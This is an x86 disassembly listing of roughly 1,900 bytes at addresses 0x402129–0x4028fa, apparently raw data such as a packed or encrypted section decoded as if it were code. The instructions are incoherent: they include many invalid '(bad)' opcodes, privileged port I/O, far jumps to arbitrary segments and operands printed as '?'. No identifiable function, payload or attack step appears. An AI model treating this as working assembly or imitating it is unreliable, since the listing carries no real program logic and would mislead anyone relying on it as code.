  402129:	jle    0x4020f7
  40212b:	push   eax
  40212c:	mov    ?,ebx
  40212e:	out    0x38,eax
  402130:	mov    ebp,0x5e02ae0
  402135:	push   edi
  402136:	inc    ebp
  402137:	icebp  
  402138:	and    DWORD PTR [ebx+eiz*1+0x1b1bcf67],ebx
  40213f:	mov    DWORD PTR [ecx+0x2f01b5fa],esi
  402145:	jmp    0x2f99:0xa980d6f8
  40214c:	inc    ebp
  40214d:	adc    eax,0x44e40b77
  402152:	fisub  WORD PTR [ebx+0x61]
  402155:	jns    0x4020e2
  402157:	aaa    
  402158:	sbb    esi,0xffffff8f
  40215b:	or     bh,0x16
  40215e:	and    eax,0xa4994d07
  402163:	push   ecx
  402164:	ret    0x6037
  402167:	or     eax,0xe21f6a7c
  40216c:	add    al,0x44
  40216e:	push   ecx
  40216f:	add    ebx,ebx
  402171:	(bad)
  402174:	out    dx,al
  402175:	dec    eax
  402176:	test   BYTE PTR [edi+ebx*2-0x173c209a],0x1
  40217e:	push   es
  40217f:	jno    0x402120
  402181:	pop    ecx
  402182:	or     esp,DWORD PTR [ebx]
  402184:	mov    dh,0x91
  402186:	inc    edx
  402187:	in     al,dx
  402188:	inc    edi
  402189:	dec    ecx
  40218a:	fdivr  DWORD PTR [edx]
  40218c:	inc    ecx
  40218d:	and    BYTE PTR [ebx],ch
  40218f:	add    dl,BYTE PTR [ecx-0x124d57c8]
  402195:	pushf  
  402196:	out    dx,eax
  402197:	cmovnp ecx,esi
  40219a:	daa    
  40219b:	imul   ebx,ebp,0x4
  40219e:	pop    es
  40219f:	sbb    BYTE PTR [eax+edi*2],ch
  4021a2:	push   0x50
  4021a4:	xchg   edi,eax
  4021a5:	ss mov bh,0xe1
  4021a8:	dec    ebp
  4021a9:	jg     0x4021cc
  4021ab:	jmp    0x38b4:0x1a56c048
  4021b2:	out    dx,al
  4021b3:	sbb    dh,BYTE PTR [edi+0x33cc4bd3]
  4021b9:	mov    ah,0xbe
  4021bb:	sbb    bh,BYTE PTR [ebp-0x2c]
  4021be:	ficomp WORD PTR [ecx]
  4021c0:	outs   dx,BYTE PTR ds:[esi]
  4021c1:	in     eax,dx
  4021c2:	sub    al,0xd0
  4021c4:	jae    0x4021f5
  4021c6:	push   ss
  4021c7:	fidivr WORD PTR [edx]
  4021c9:	aad    0x25
  4021cb:	push   eax
  4021cc:	lea    eax,[ebp+0x53]
  4021cf:	popf   
  4021d0:	pushf  
  4021d1:	jb     0x402185
  4021d3:	jmp    0xaee2:0x1563dbc6
  4021da:	inc    BYTE PTR [edx-0x35089e85]
  4021e0:	push   ss
  4021e1:	jae    0x40220b
  4021e3:	pop    ebx
  4021e4:	lods   al,BYTE PTR ds:[esi]
  4021e5:	cmp    DWORD PTR [ebx+edi*2],edi
  4021e8:	test   DWORD PTR [ecx+0x70],ecx
  4021eb:	jb     0x402238
  4021ed:	or     BYTE PTR [ecx-0x2fbe8dd1],al
  4021f3:	or     al,0x1b
  4021f5:	inc    ebx
  4021f6:	call   0xab194b83
  4021fb:	lahf   
  4021fc:	mov    ebx,0x2e840f86
  402201:	repnz pop ds
  402203:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402204:	lea    ebx,[eax]
  402206:	lock shl DWORD PTR [ebp-0x6e],0xad
  40220b:	pop    esi
  40220c:	ds pop edi
  40220e:	xchg   esp,eax
  40220f:	int3   
  402210:	and    al,0x37
  402212:	pop    esi
  402213:	movq   mm5,mm0
  402216:	pushf  
  402217:	pop    eax
  402218:	push   ecx
  402219:	push   ebx
  40221a:	stos   BYTE PTR es:[edi],al
  40221b:	dec    edx
  40221c:	pusha  
  40221d:	sub    esi,ecx
  40221f:	into   
  402220:	pop    ebp
  402221:	shl    BYTE PTR ds:0x381acb18,cl
  402227:	pop    ds
  402228:	(bad)  
  402229:	add    eax,0x954d53f5
  40222e:	mov    es:0xdf195de5,eax
  402234:	stos   DWORD PTR es:[edi],eax
  402235:	jns    0x4021fb
  402237:	pop    esp
  402238:	test   DWORD PTR [ebp-0x1a],edi
  40223b:	out    0x24,eax
  40223d:	addr16 icebp 
  40223f:	mov    WORD PTR [edx-0x5fb58e37],cs
  402245:	lock mov ah,0x56
  402248:	daa    
  402249:	dec    ebp
  40224a:	lods   eax,DWORD PTR ds:[esi]
  40224b:	or     al,0xfd
  40224d:	dec    esp
  40224e:	std    
  40224f:	outs   dx,BYTE PTR ds:[esi]
  402250:	loope  0x4022b2
  402252:	arpl   WORD PTR [eax],cx
  402254:	adc    dh,0x65
  402257:	lahf   
  402258:	mov    ecx,DWORD PTR [ecx+0x5c86ad5]
  40225e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40225f:	or     DWORD PTR [edi+esi*1-0x77b5cc79],ecx
  402266:	cwde   
  402267:	pop    ecx
  402268:	ja     0x4021fa
  40226a:	fadd   DWORD PTR [esi-0x2f]
  40226d:	es (bad) 
  40226f:	(bad)  
  402271:	pop    ss
  402272:	das    
  402273:	jne    0x4022a5
  402275:	ret    
  402276:	nop
  402277:	aad    0xfa
  402279:	es in  eax,dx
  40227b:	xchg   ebp,eax
  40227c:	test   DWORD PTR [esi+0xa14211b],esp
  402282:	fs in  al,0x26
  402285:	pop    esp
  402286:	sbb    eax,0x7d6927a
  40228b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40228c:	arpl   ax,ax
  40228e:	es es into 
  402291:	add    eax,0xaeae7b84
  402296:	nop
  402297:	enter  0xd628,0xe7
  40229b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40229c:	mov    ecx,0x6fb7a5f4
  4022a1:	in     al,0xce
  4022a3:	sub    BYTE PTR [esi],0x2c
  4022a6:	dec    esp
  4022a7:	das    
  4022a8:	mov    al,ds:0xb5ec692
  4022ad:	fiadd  WORD PTR [esi]
  4022af:	icebp  
  4022b0:	push   ebp
  4022b1:	add    BYTE PTR [eax-0x2df8c7b2],bl
  4022b7:	pop    ds
  4022b8:	fsub   QWORD PTR [esi]
  4022ba:	hlt    
  4022bb:	fistp  DWORD PTR [esi+0x7087dee2]
  4022c1:	out    dx,eax
  4022c2:	sub    eax,0x5a834118
  4022c7:	cmp    bh,BYTE PTR [eax]
  4022c9:	jmp    DWORD PTR [edi+0x35a3e86b]
  4022cf:	test   DWORD PTR [edx+0x36a9225f],edi
  4022d5:	test   BYTE PTR [ecx],ah
  4022d7:	imul   edi,DWORD PTR [ebp+0x68],0x872474d7
  4022de:	fisub  WORD PTR [edx+0x59d21183]
  4022e4:	cmp    DWORD PTR [edi+0x10],esp
  4022e7:	enter  0xfee1,0xea
  4022eb:	fdiv   QWORD PTR [ebx-0x75]
  4022ee:	sbb    eax,0x79162cf7
  4022f3:	dec    eax
  4022f4:	es pop edi
  4022f6:	in     eax,0x83
  4022f8:	add    cl,BYTE PTR [ebx-0x1c]
  4022fb:	pop    ds
  4022fc:	out    dx,eax
  4022fd:	call   0x94b6510c
  402302:	adc    al,0x11
  402304:	nop
  402305:	add    eax,0x5e2f1ca1
  40230a:	cdq    
  40230b:	inc    eax
  40230c:	je     0x4022a6
  40230e:	sub    esp,DWORD PTR [ebp+0x7a]
  402311:	out    0xa8,eax
  402313:	loop   0x4022de
  402315:	iret   
  402316:	cmp    ch,BYTE PTR [edx+0x2f3ca51c]
  40231c:	aam    0x8
  40231e:	scas   eax,DWORD PTR es:[edi]
  40231f:	cmp    al,0x93
  402321:	in     al,0x81
  402323:	shl    DWORD PTR [ebx+ecx*1],1
  402326:	retf   0x6bd
  402329:	scas   eax,DWORD PTR es:[edi]
  40232a:	adc    al,0x1d
  40232c:	pop    ss
  40232d:	dec    esi
  40232e:	and    ebx,0xffffff91
  402331:	ror    DWORD PTR [ebp-0x49],0x32
  402335:	xor    ah,dh
  402337:	data16 adc BYTE PTR [esi],bh
  40233a:	inc    esi
  40233b:	jns    0x4022dc
  40233d:	and    dl,bh
  40233f:	xor    eax,0xa9d44dd6
  402344:	sub    eax,0xb5f4e789
  402349:	repz fwait
  40234b:	mov    eax,esi
  40234d:	icebp  
  40234e:	pop    edi
  40234f:	fdivr  DWORD PTR [ecx-0x54426594]
  402355:	push   eax
  402356:	leave  
  402357:	and    eax,edi
  402359:	adc    DWORD PTR [eax+0x505563b1],eax
  40235f:	cld    
  402360:	jns    0x402321
  402362:	dec    ebp
  402363:	outs   dx,BYTE PTR ds:[esi]
  402364:	mov    edi,0x543281fa
  402369:	test   ah,bl
  40236b:	test   BYTE PTR [esp+edx*8],0xf3
  40236f:	inc    ecx
  402370:	jns    0x402331
  402372:	gs sub eax,0x1b5d15ec
  402378:	cmp    al,0x6e
  40237a:	xor    DWORD PTR [edx+0x43bc2104],edi
  402380:	mov    edi,DWORD PTR [edx+0x464319d6]
  402386:	mov    edi,0x845f9d08
  40238b:	ss enter 0xbc8c,0xcf
  402390:	jae    0x402318
  402392:	(bad)  
  402393:	sub    ch,0x1e
  402396:	cmp    DWORD PTR [eax],edx
  402398:	lods   eax,DWORD PTR ds:[esi]
  402399:	clc    
  40239a:	and    bl,BYTE PTR [esi+0x24]
  40239d:	retf   0x174a
  4023a0:	cli    
  4023a1:	jmp    0x5861301
  4023a6:	sbb    eax,0x4c809010
  4023ab:	dec    edi
  4023ac:	sbb    DWORD PTR [edx-0x1120b11b],esp
  4023b2:	xor    al,0x63
  4023b4:	int    0xa9
  4023b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023b7:	test   BYTE PTR [eax+ebx*1],ah
  4023ba:	loop   0x4023c1
  4023bc:	fdiv   DWORD PTR [esi]
  4023be:	mov    WORD PTR [eax-0x168f07b0],fs
  4023c4:	pop    ebp
  4023c5:	pop    esi
  4023c6:	fdivr  st(7),st
  4023c8:	inc    ebx
  4023c9:	pop    ds
  4023ca:	jp     0x402352
  4023cc:	inc    ebx
  4023cd:	shl    DWORD PTR ds:0x85db0ac9,1
  4023d3:	aaa    
  4023d4:	sbb    ecx,DWORD PTR [ecx]
  4023d6:	sub    al,0xee
  4023d8:	lock std 
  4023da:	push   esi
  4023db:	and    al,0xea
  4023dd:	add    DWORD PTR [eax+0x11],0xfa9211bb
  4023e4:	cdq    
  4023e5:	adc    al,BYTE PTR [ebp+0x43]
  4023e8:	xchg   DWORD PTR [ebx+0x26c8dc1d],edx
  4023ee:	push   edi
  4023ef:	leave  
  4023f0:	mov    edi,0xb449fde2
  4023f5:	mov    BYTE PTR [ecx-0x5084c7dc],0xf
  4023fc:	sbb    dh,BYTE PTR [esi]
  4023fe:	sub    al,0x2f
  402400:	shr    DWORD PTR [ecx-0x7fbbdea3],0x75
  402407:	sub    esi,DWORD PTR [edx-0x46]
  40240a:	ss push es
  40240c:	fwait
  40240d:	gs sahf 
  40240f:	repz and al,0x41
  402412:	inc    ecx
  402413:	inc    edx
  402414:	jecxz  0x4023a6
  402416:	dec    ecx
  402417:	jne    0x4023b2
  402419:	sahf   
  40241a:	loopne 0x40246a
  40241c:	sub    al,0x8a
  40241e:	test   dh,bl
  402420:	cmp    DWORD PTR [esi],eax
  402422:	sub    eax,0x85f68951
  402428:	xor    eax,0x8864b705
  40242d:	lds    eax,FWORD PTR [eax*2-0x26c479a1]
  402434:	call   0x9da9:0xc268f7e7
  40243b:	dec    ebp
  40243c:	jno    0x4023c8
  40243e:	scas   eax,DWORD PTR es:[edi]
  40243f:	or     ecx,ebx
  402441:	pusha  
  402442:	xchg   ebp,eax
  402443:	jge    0x402486
  402445:	pop    edi
  402446:	mov    bh,0xc9
  402448:	pop    ebx
  402449:	ret    0x1a22
  40244c:	or     eax,0xe12c3621
  402451:	or     bl,al
  402453:	xlat   BYTE PTR ds:[ebx]
  402454:	lock cmc 
  402456:	dec    DWORD PTR [edi]
  402458:	je     0x4024cf
  40245a:	mov    edx,DWORD PTR [ecx-0x7cb13434]
  402460:	loope  0x40241c
  402462:	adc    al,0x0
  402464:	iret   
  402465:	mov    eax,0x97f58749
  40246a:	pop    es
  40246b:	shl    DWORD PTR [ebx-0x4a6d8435],1
  402471:	sti    
  402472:	dec    edx
  402473:	fdivp  st(2),st
  402475:	and    dl,BYTE PTR [edi]
  402477:	test   al,0xe3
  402479:	mov    WORD PTR [eax-0x6e],?
  40247c:	data16 jnp 0x402406
  40247f:	cwde   
  402480:	jl     0x402470
  402482:	gs push ds
  402484:	mov    esp,0x27bd9680
  402489:	out    0x34,al
  40248b:	popa   
  40248c:	sub    edx,DWORD PTR [esp+edx*8-0x28]
  402490:	ds mov bl,0x44
  402493:	mov    DWORD PTR [ecx-0x55],0x7487af46
  40249a:	dec    ebp
  40249b:	cmc    
  40249c:	pop    es
  40249d:	jecxz  0x40243e
  40249f:	xor    DWORD PTR [esi],eax
  4024a1:	(bad)  
  4024a2:	scas   eax,DWORD PTR es:[edi]
  4024a3:	imul   edi,ecx,0x69
  4024a6:	(bad)  
  4024a7:	int    0x5f
  4024a9:	sub    al,0xb0
  4024ab:	cli    
  4024ac:	rol    BYTE PTR [eax-0xacd5422],cl
  4024b2:	or     DWORD PTR [esi+0x10],edi
  4024b5:	jne    0x4024bc
  4024b7:	xor    BYTE PTR [edi+eiz*2-0x74],ah
  4024bb:	mov    esp,0xd1f9e013
  4024c0:	and    BYTE PTR [ebx-0x6],dl
  4024c3:	mov    edi,DWORD PTR ds:0x6453e452
  4024c9:	imul   ecx,DWORD PTR [eax+0x1110f728],0x25f75e87
  4024d3:	repnz (bad) 
  4024d5:	ret    
  4024d6:	pop    ebp
  4024d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4024d8:	dec    ebp
  4024d9:	xor    al,0x7f
  4024db:	mov    eax,0x8e7567b
  4024e0:	and    ah,BYTE PTR [edi+0x184ab562]
  4024e6:	lods   eax,DWORD PTR ds:[esi]
  4024e7:	lahf   
  4024e8:	out    0x9a,al
  4024ea:	pusha  
  4024eb:	icebp  
  4024ec:	xchg   edi,eax
  4024ed:	(bad)  
  4024ee:	cmp    edi,DWORD PTR [edx+0x5b]
  4024f1:	jle    0x4024fa
  4024f3:	jnp    0x4024c4
  4024f5:	fs in  al,dx
  4024f7:	xor    DWORD PTR [ecx],ebx
  4024f9:	dec    edx
  4024fa:	xchg   esi,eax
  4024fb:	(bad)  
  4024fc:	bound  ecx,QWORD PTR [esi-0x7]
  4024ff:	(bad)  [edi-0x72d4a888]
  402505:	mov    edx,0xd2740d30
  40250a:	and    ebx,DWORD PTR [edx+0x4c39af26]
  402510:	pusha  
  402511:	lods   al,BYTE PTR ds:[esi]
  402512:	dec    ecx
  402513:	shl    DWORD PTR [edx+0x629f2387],1
  402519:	scas   al,BYTE PTR es:[edi]
  40251a:	adc    al,0xf3
  40251c:	pop    ecx
  40251d:	cmp    ecx,ecx
  40251f:	dec    ebx
  402520:	pop    ecx
  402521:	mov    es,ebx
  402523:	stc    
  402524:	jae    0x402533
  402526:	inc    ecx
  402527:	jp     0x402575
  402529:	mov    bl,0xb3
  40252b:	dec    ecx
  40252c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40252d:	mov    ds:0x5aff8d70,al
  402532:	jp     0x402536
  402534:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402535:	mov    ecx,0x1a941181
  40253a:	clc    
  40253b:	push   cs
  40253c:	sub    BYTE PTR [esp+edx*8+0x29e2c89c],cl
  402543:	cmp    eax,0xdde92934
  402548:	jno    0x4024e7
  40254a:	enter  0xf8ff,0xac
  40254e:	inc    ebx
  40254f:	ficomp WORD PTR [ebp+0x66]
  402552:	push   ss
  402553:	inc    esi
  402554:	sbb    ecx,DWORD PTR [eax+0x2515dc20]
  40255a:	popf   
  40255b:	int3   
  40255c:	cmp    dl,bh
  40255e:	mov    dh,0x2e
  402560:	fsubr  DWORD PTR [edi-0x12ab2024]
  402566:	cdq    
  402567:	xor    edx,0x3232d780
  40256d:	or     ah,BYTE PTR [edx+edi*8]
  402570:	sub    BYTE PTR [ecx+ecx*4],al
  402573:	pop    ss
  402574:	fidiv  DWORD PTR [edi]
  402576:	js     0x402549
  402578:	aad    0x6e
  40257a:	inc    eax
  40257b:	bound  eax,QWORD PTR [eax]
  40257d:	jne    0x4025b0
  40257f:	jge    0x4025c4
  402581:	or     al,0xad
  402583:	mov    dh,bh
  402585:	xor    BYTE PTR [ecx-0x7e],bh
  402588:	test   DWORD PTR [ecx],0xe5a73950
  40258e:	test   DWORD PTR [esi+0x4616cd69],0xcad75d1a
  402598:	repz jp 0x402528
  40259b:	mov    ah,0xef
  40259d:	fstp   st(2)
  40259f:	ins    BYTE PTR es:[edi],dx
  4025a0:	mov    edi,DWORD PTR [ecx-0x33]
  4025a3:	or     al,0x54
  4025a5:	out    dx,al
  4025a6:	dec    eax
  4025a7:	or     cl,dh
  4025a9:	xchg   ebp,eax
  4025aa:	mov    edx,0x4cf572a2
  4025af:	(bad)  
  4025b1:	(bad)  
  4025b2:	jmp    0x402573
  4025b4:	mov    ch,0x82
  4025b6:	adc    dh,ch
  4025b8:	lods   eax,DWORD PTR ds:[esi]
  4025b9:	pop    es
  4025ba:	std    
  4025bb:	add    eax,0x90e827db
  4025c0:	add    ch,al
  4025c2:	push   esp
  4025c3:	(bad)  
  4025c5:	fbstp  TBYTE PTR [ebp+0x3e32b837]
  4025cb:	dec    ebx
  4025cc:	mov    ds:0x3c6abd8d,eax
  4025d1:	rcl    DWORD PTR [edi+esi*2-0xcd6b74b],cl
  4025d8:	sbb    al,0x6
  4025da:	retf   
  4025db:	shl    BYTE PTR [eax+0x4953f4ee],0x35
  4025e2:	mov    edi,0xd562701d
  4025e7:	adc    BYTE PTR [esi-0x7b],ch
  4025ea:	adc    eax,0xa8d3146d
  4025ef:	adc    eax,0x3d70e6a
  4025f4:	jns    0x40257a
  4025f6:	out    dx,eax
  4025f7:	mov    dh,0xd0
  4025f9:	jne    0x4025e4
  4025fb:	jno    0x40258c
  4025fd:	mov    cr6,esp
  402600:	fwait
  402601:	int    0x8d
  402603:	ficom  DWORD PTR [ebx+0x34]
  402606:	pop    ebp
  402607:	push   ebx
  402608:	jmp    0x40267b
  40260a:	test   al,0x1b
  40260c:	fdivp  st(7),st
  40260e:	test   ch,0x10
  402611:	push   edx
  402612:	jmp    0x4025ff
  402614:	cmp    ah,BYTE PTR [ecx]
  402616:	fstp   TBYTE PTR [ebx+0x63a13bfa]
  40261c:	sbb    DWORD PTR [ecx*1+0x1bbc394],edi
  402623:	sbb    eax,DWORD PTR [edx-0x4b96ce4c]
  402629:	pop    esi
  40262a:	popa   
  40262b:	dec    edi
  40262c:	ins    BYTE PTR es:[edi],dx
  40262d:	inc    ebp
  40262e:	(bad)  
  40262f:	or     edx,esp
  402631:	gs xor ebp,edx
  402634:	pop    ds
  402635:	add    edx,edi
  402637:	loop   0x4025bc
  402639:	mov    eax,0x91668e1e
  40263e:	loop   0x4025e3
  402640:	add    DWORD PTR [ebx-0x4ebe12a0],ecx
  402646:	ret    0xa2f4
  402649:	pop    eax
  40264a:	outs   dx,DWORD PTR ds:[esi]
  40264b:	and    eax,0x2b400eae
  402650:	dec    ecx
  402651:	xchg   esi,eax
  402652:	or     cl,BYTE PTR [esp+eiz*8]
  402655:	jp     0x402680
  402657:	add    ah,ah
  402659:	stos   DWORD PTR es:[edi],eax
  40265a:	outs   dx,BYTE PTR ds:[esi]
  40265b:	stos   BYTE PTR es:[edi],al
  40265c:	por    mm0,mm0
  40265f:	idiv   cl
  402661:	dec    edx
  402662:	and    ecx,ebp
  402664:	inc    esp
  402665:	icebp  
  402666:	mov    eax,0x6f02f070
  40266b:	push   ss
  40266c:	les    ebp,FWORD PTR [esp+edi*2+0x2b17f818]
  402673:	fstp   DWORD PTR [edx-0x48]
  402676:	sbb    eax,DWORD PTR [edi+0x2e]
  402679:	arpl   WORD PTR [ecx],ax
  40267b:	inc    esi
  40267c:	sub    cl,BYTE PTR [ecx]
  40267e:	arpl   WORD PTR [esi-0x22f45bab],sp
  402684:	ds repz fwait
  402687:	and    al,BYTE PTR [ecx]
  402689:	jnp    0x402706
  40268b:	retf   
  40268c:	mov    bh,0x54
  40268e:	xchg   edx,eax
  40268f:	mov    WORD PTR [ebp+0x4dbf83c2],?
  402695:	int3   
  402696:	fs xchg di,ax
  402699:	fcomp  QWORD PTR [esi-0x3341f272]
  40269f:	mov    cl,BYTE PTR [eax-0x45]
  4026a2:	or     ecx,DWORD PTR [edi]
  4026a4:	shr    ebp,0xd2
  4026a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026a8:	fisttp QWORD PTR [edi+eax*1+0x41]
  4026ac:	idiv   edi
  4026ae:	loopne 0x402668
  4026b0:	retf   
  4026b1:	xor    DWORD PTR [ebx-0x47],ecx
  4026b4:	xchg   edi,eax
  4026b5:	retf   0xf5c1
  4026b8:	adc    al,0x50
  4026ba:	sub    dl,BYTE PTR ds:0x9b4d8cf1
  4026c0:	add    BYTE PTR [edi],0xf1
  4026c3:	dec    esp
  4026c4:	pop    edi
  4026c5:	xchg   ah,dl
  4026c7:	aad    0x33
  4026c9:	adc    ecx,DWORD PTR [eax+edx*2+0x6c]
  4026cd:	pushf  
  4026ce:	xor    dl,BYTE PTR [eax-0x45]
  4026d1:	xchg   DWORD PTR [edi-0x79],ecx
  4026d4:	shl    esi,1
  4026d6:	jl     0x4026a1
  4026d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026d9:	fcomi  st,st(2)
  4026db:	into   
  4026dc:	adc    al,0x4b
  4026de:	nop
  4026df:	mov    gs,esi
  4026e1:	or     BYTE PTR [eax+0xc],bl
  4026e4:	push   0x48b756aa
  4026e9:	dec    eax
  4026ea:	pop    ss
  4026eb:	bswap  esp
  4026ed:	push   esp
  4026ee:	pop    esi
  4026ef:	push   ds
  4026f0:	push   ds
  4026f1:	out    dx,eax
  4026f2:	pop    ebx
  4026f3:	lods   eax,DWORD PTR ds:[esi]
  4026f4:	imul   ebp,DWORD PTR [edi-0x321b563f],0xeb7afe32
  4026fe:	jl     0x402732
  402700:	xchg   ebx,eax
  402701:	add    DWORD PTR [edi+0x3ff09d66],edi
  402707:	xchg   ebx,eax
  402708:	into   
  402709:	xor    al,0xc4
  40270b:	cwde   
  40270c:	int    0xc6
  40270e:	aas    
  40270f:	sahf   
  402710:	rol    DWORD PTR [eax],1
  402712:	or     eax,DWORD PTR [eax]
  402714:	xchg   edx,eax
  402715:	mov    BYTE PTR [ebx-0x7d6e75b3],cl
  40271b:	stos   DWORD PTR es:[edi],eax
  40271c:	jmp    0x20cf5f96
  402721:	jle    0x402707
  402723:	out    dx,eax
  402724:	pop    eax
  402725:	push   ebp
  402726:	sub    edx,DWORD PTR [eax]
  402728:	mov    bh,0x6d
  40272a:	jno    0x402765
  40272c:	pop    es
  40272d:	loopne 0x4026d6
  40272f:	sub    dh,BYTE PTR [esi+0x6f]
  402732:	jnp    0x4026ee
  402734:	push   ebp
  402735:	popf   
  402736:	inc    esi
  402737:	inc    esi
  402738:	and    BYTE PTR [edi+ebx*8+0x6ccee90a],0x60
  402740:	rol    ah,cl
  402742:	les    eax,FWORD PTR [eax-0x1221170e]
  402748:	aad    0x2c
  40274a:	dec    ecx
  40274b:	pushf  
  40274c:	fdivp  st(7),st
  40274e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40274f:	js     0x402728
  402751:	xor    DWORD PTR [esi],eax
  402753:	es dec ecx
  402755:	or     BYTE PTR [edx+0x7e0a5b40],dh
  40275b:	stos   DWORD PTR es:[edi],eax
  40275c:	ror    eax,cl
  40275e:	stc    
  40275f:	aad    0x4e
  402761:	jecxz  0x402767
  402763:	leave  
  402764:	imul   eax,DWORD PTR [ecx-0x33],0xe5be0f59
  40276b:	aaa    
  40276c:	dec    esi
  40276d:	jg     0x40271a
  40276f:	cmp    al,0x5a
  402771:	push   edx
  402772:	data16 jmp 0x40278a
  402775:	cmp    al,0x15
  402777:	xchg   ebp,eax
  402778:	ret    
  402779:	cmp    BYTE PTR [ebx+eiz*2+0x78],0x8d
  40277e:	inc    edi
  40277f:	lods   eax,DWORD PTR ds:[esi]
  402780:	mov    ch,0x95
  402782:	mov    eax,ds:0x128fce09
  402787:	sbb    edi,esi
  402789:	add    eax,0x62c326bb
  40278e:	gs dec ecx
  402790:	daa    
  402791:	lahf   
  402792:	inc    ecx
  402793:	scas   al,BYTE PTR es:[edi]
  402794:	loope  0x4027ea
  402796:	call   0xdcc3:0x687e3341
  40279d:	mov    ecx,0xe44a6d5d
  4027a2:	fwait
  4027a3:	(bad)  
  4027a4:	mov    eax,0x70add685
  4027a9:	adc    ebp,DWORD PTR ds:0xbb1d63d9
  4027af:	jecxz  0x40282d
  4027b1:	adc    edi,esp
  4027b3:	fisub  WORD PTR [ecx]
  4027b5:	fisub  DWORD PTR [edi+0x4e1b7317]
  4027bb:	jl     0x402752
  4027bd:	cwde   
  4027be:	dec    eax
  4027bf:	push   esi
  4027c0:	jbe    0x4027b9
  4027c2:	mov    edx,0xec8f191d
  4027c7:	imul   DWORD PTR [ecx]
  4027c9:	in     eax,dx
  4027ca:	mov    al,BYTE PTR [edx-0x29d1716c]
  4027d0:	aaa    
  4027d1:	jae    0x402836
  4027d3:	stos   BYTE PTR es:[edi],al
  4027d4:	push   edi
  4027d5:	and    al,0x7e
  4027d7:	test   al,0x35
  4027d9:	sahf   
  4027da:	icebp  
  4027db:	out    0x3e,eax
  4027dd:	adc    al,0xa8
  4027df:	daa    
  4027e0:	add    eax,0x373d2961
  4027e5:	pop    ss
  4027e6:	pop    ecx
  4027e7:	(bad)  
  4027e8:	fisttp WORD PTR [esi-0x2776f015]
  4027ee:	cmp    eax,0xa3804171
  4027f3:	pop    eax
  4027f4:	enter  0x2567,0x2e
  4027f8:	sub    al,0xa1
  4027fa:	push   0xffffffb9
  4027fc:	pop    ebx
  4027fd:	pop    ecx
  4027fe:	push   edi
  4027ff:	scas   eax,DWORD PTR es:[edi]
  402800:	dec    edx
  402801:	dec    esp
  402802:	pop    ecx
  402803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402804:	adc    ecx,DWORD PTR [ebp+0x7]
  402807:	jge    0x4027fd
  402809:	imul   eax,DWORD PTR [edi-0x54b4912e],0xfc5440e6
  402813:	aad    0xdb
  402815:	mov    edi,0xe488795f
  40281a:	mov    dl,0x12
  40281c:	popa   
  40281d:	out    0x7a,al
  40281f:	lock xchg ecx,eax
  402821:	cdq    
  402822:	dec    eax
  402823:	sbb    al,0x5c
  402825:	lods   eax,DWORD PTR ds:[esi]
  402826:	and    al,0xd3
  402828:	pop    es
  402829:	sbb    ah,BYTE PTR [esi]
  40282b:	xor    edi,DWORD PTR [edx-0x21]
  40282e:	sahf   
  40282f:	sub    cl,dh
  402831:	sbb    ch,BYTE PTR [ebx]
  402833:	dec    edi
  402834:	int3   
  402835:	call   0x93fb08aa
  40283a:	popf   
  40283b:	sub    eax,0x5619264e
  402840:	dec    ebp
  402841:	and    BYTE PTR [ecx],0xb4
  402844:	shl    BYTE PTR [ebx+0x3],cl
  402847:	out    dx,eax
  402848:	hlt    
  402849:	das    
  40284a:	mov    ah,0x6b
  40284c:	dec    edi
  40284d:	jnp    0x40287d
  40284f:	jne    0x4028b3
  402851:	inc    edx
  402852:	sub    BYTE PTR [edx],cl
  402854:	inc    edi
  402855:	mov    ds:0xc66bc518,eax
  40285a:	in     eax,0x1d
  40285c:	or     eax,0xce6a72f3
  402861:	retf   0x91e9
  402864:	out    0xf1,eax
  402866:	leave  
  402867:	inc    ebx
  402868:	adc    esp,eax
  40286a:	(bad)  
  40286b:	jbe    0x40286e
  40286d:	inc    ebx
  40286e:	ins    BYTE PTR es:[edi],dx
  40286f:	imul   esi,DWORD PTR [ebp-0x10c2944a],0x29
  402876:	mov    eax,ebp
  402878:	popf   
  402879:	in     eax,0x7b
  40287b:	xor    BYTE PTR [ebx],0xc6
  40287e:	idiv   esp
  402880:	loop   0x40287d
  402882:	mov    ch,0x10
  402884:	cmp    edx,DWORD PTR [esi+eiz*2]
  402887:	jmp    0x4028d4
  402889:	sbb    esp,0xdcc6d19
  40288f:	fstp   TBYTE PTR [esi+0x2b]
  402892:	or     eax,0x707319a0
  402897:	mov    dl,BYTE PTR [ebx]
  402899:	fwait
  40289a:	outs   dx,DWORD PTR ds:[esi]
  40289b:	stos   DWORD PTR es:[edi],eax
  40289c:	sahf   
  40289d:	jp     0x402835
  40289f:	dec    ebp
  4028a0:	cs adc al,0xc5
  4028a3:	pop    esi
  4028a4:	pop    ss
  4028a5:	xchg   ecx,eax
  4028a6:	mov    cl,0x2c
  4028a8:	call   0xe4b1ec54
  4028ad:	mov    al,ds:0x190ddbe5
  4028b2:	fwait
  4028b3:	mov    eax,ds:0xb218b544
  4028b8:	adc    cl,cl
  4028ba:	ds push 0x43
  4028bd:	mov    ebx,0x49df3118
  4028c2:	retf   0x7a7
  4028c5:	outs   dx,BYTE PTR ds:[esi]
  4028c6:	jae    0x4028b3
  4028c8:	push   esi
  4028c9:	mov    al,ch
  4028cb:	mov    edi,DWORD PTR [esi+0x6d989f1f]
  4028d1:	push   ecx
  4028d2:	xchg   ebp,eax
  4028d3:	lds    eax,FWORD PTR [eax+0x537cc311]
  4028d9:	test   esi,0x8830397b
  4028df:	pop    ecx
  4028e0:	mov    eax,ds:0x1b1913d8
  4028e5:	cdq    
  4028e6:	retf   
  4028e7:	sbb    DWORD PTR [ebx+0x61],edi
  4028ea:	mov    esi,0xd4859f72
  4028ef:	aad    0x2e
  4028f1:	jb     0x402968
  4028f3:	sahf   
  4028f4:	lds    edx,FWORD PTR [edx+0x5cf6b0f2]
  4028fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
